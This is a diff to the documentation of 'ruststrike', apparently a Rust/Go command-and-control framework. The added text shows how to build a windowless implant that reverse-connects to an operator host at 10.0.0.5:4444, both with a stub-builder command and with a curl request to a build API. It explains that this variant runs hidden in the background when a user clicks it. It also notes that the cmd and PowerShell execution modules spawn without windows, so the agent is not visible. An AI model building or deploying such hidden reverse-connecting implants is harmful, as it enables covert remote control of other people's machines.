@@ -146,15 +146,41 @@ Two ways to patch a base `ruststrike-implant.exe`:
 cd tools/stubbuilder && go build -o stubbuilder.exe .
 ./stubbuilder.exe ../../target/release/ruststrike-implant.exe out.exe 10.0.0.5 4444
 # out.exe now reverse-connects to 10.0.0.5:4444 with no args
+# For a windowless (no console) agent, patch the silent base instead:
+./stubbuilder.exe ../../target/release/ruststrike-implant-silent.exe out.exe 10.0.0.5 4444
 
 # or via the Go core REST (used by the GUI's Generate Agent button)
 curl -X POST "http://127.0.0.1:8091/api/stub/build" \
-  -H 'Content-Type: application/json' -d '{"host":"10.0.0.5","port":"4444"}'
+  -H 'Content-Type: application/json' -d '{"host":"10.0.0.5","port":"4444","silent":true}'
 # -> {"exe_b64":"..."}  (base64-decode to the patched exe)
+# silent=true picks the GUI-subsystem base exe (no console window on launch);
+# silent=false (or omitted) uses the console build.
 ```
 
 Re-patching an already-patched exe strips the old trailer first (no
 accumulation). The trailer is host:port only for v1 (no sleep/jitter/SSL yet).
+
+### Silent (windowless) implant
+
+The workspace builds **two** implant variants from the same lib
+(`crates/implant/src/lib.rs`):
+
+- `ruststrike-implant.exe` — **console subsystem** (subsystem 3). Pops a console
+  window on launch; use for dev (the `[implant]` logs are visible with
+  `--features verbose`).
+- `ruststrike-implant-silent.exe` — **GUI subsystem** (subsystem 2). Built with
+  `#![windows_subsystem = "windows"]`; no console window at all, so "click to
+  run" launches it hidden in the background. Use this for deployed agents.
+
+The command-exec BOFs (`cmd_exec`/`powershell_exec`/`winapi_exec`) already
+spawn their `cmd.exe`/`powershell.exe`/target children with `CREATE_NO_WINDOW`
+(0x08000000), so even the console implant's spawned commands are windowless —
+the only visible window was the implant's own console, which the silent variant
+removes. The result: a silent agent runs entirely in the background.
+
+The GUI's Generate Agent modal has a **"Silent (no console window)"** checkbox
+(default on); the stub builder's `silent` body flag selects the base exe.
+
 
 ## v1 limitations
 
